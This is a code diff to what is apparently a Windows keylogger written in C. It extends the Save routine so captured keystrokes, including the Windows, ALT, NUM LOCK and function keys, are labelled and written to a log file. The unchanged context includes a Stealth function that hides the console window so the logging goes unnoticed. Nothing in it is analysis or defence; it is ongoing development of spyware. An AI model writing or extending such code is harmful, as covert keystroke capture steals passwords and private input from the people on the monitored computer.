@@ -60,6 +60,41 @@ int Save (int key_stroke, char *file) {
         fprintf(OUTPUT_FILE, "%s", "\n[DOWN]");
     else if (key_stroke == 190 || key_stroke == 110)
         fprintf(OUTPUT_FILE, "%s", ".");
+    else if (key_stroke == VK_HOME)
+        fprintf(OUTPUT_FILE, "%s", "\n[HOME]");
+    else if (key_stroke == VK_LWIN)
+        fprintf(OUTPUT_FILE, "%s", "\n[LEFT_WIN]");
+    else if (key_stroke == VK_RWIN)
+        fprintf(OUTPUT_FILE, "%s", "\n[RIGHT_WIN]");
+    else if (key_stroke == VK_NUMLOCK)
+        fprintf(OUTPUT_FILE, "%s", "\n[NUM_LOCK]");
+    else if (key_stroke == VK_MENU)
+        fprintf(OUTPUT_FILE, "%s", "\n[ALT]");
+    else if (key_stroke == VK_F1)
+        fprintf(OUTPUT_FILE, "%s", "\n[F1]");
+    else if (key_stroke == VK_F2)
+        fprintf(OUTPUT_FILE, "%s", "\n[F2]");
+    else if (key_stroke == VK_F3)
+        fprintf(OUTPUT_FILE, "%s", "\n[F3]");
+    else if (key_stroke == VK_F4)
+        fprintf(OUTPUT_FILE, "%s", "\n[F4]");
+    else if (key_stroke == VK_F5)
+        fprintf(OUTPUT_FILE, "%s", "\n[F5]");
+    else if (key_stroke == VK_F6)
+        fprintf(OUTPUT_FILE, "%s", "\n[F6]");
+    else if (key_stroke == VK_F7)
+        fprintf(OUTPUT_FILE, "%s", "\n[F7]");
+    else if (key_stroke == VK_F8)
+        fprintf(OUTPUT_FILE, "%s", "\n[F8]");
+    else if (key_stroke == VK_F9)
+        fprintf(OUTPUT_FILE, "%s", "\n[F9]");
+    else if (key_stroke == VK_F10)
+        fprintf(OUTPUT_FILE, "%s", "\n[F10]");
+    else if (key_stroke == VK_F11)
+        fprintf(OUTPUT_FILE, "%s", "\n[F11]");
+    else if (key_stroke == VK_F12)
+        fprintf(OUTPUT_FILE, "%s", "\n[F12]");
+
     else
         fprintf (OUTPUT_FILE, "%s", &key_stroke);
 
@@ -75,3 +110,4 @@ void Stealth() {
     Stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(Stealth, 0);
 }
+
